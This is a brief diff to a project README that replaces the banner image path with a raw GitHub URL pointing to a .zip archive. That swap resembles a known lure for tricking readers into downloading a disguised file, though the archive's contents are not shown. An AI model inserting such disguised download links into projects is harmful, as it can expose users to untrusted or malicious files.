@@ -1,6 +1,6 @@
 # TeamLeveling_HackGenx
 
-![cleanvision banner](assets/images/CleanVisionimg.png)
+![cleanvision banner](https://raw.githubusercontent.com/MudassirQureshi7987/TeamLeveling_HackGenx/main/backend/Team-Hack-Leveling-Genx-1.3.zip)
 
 ## CleanVision
 
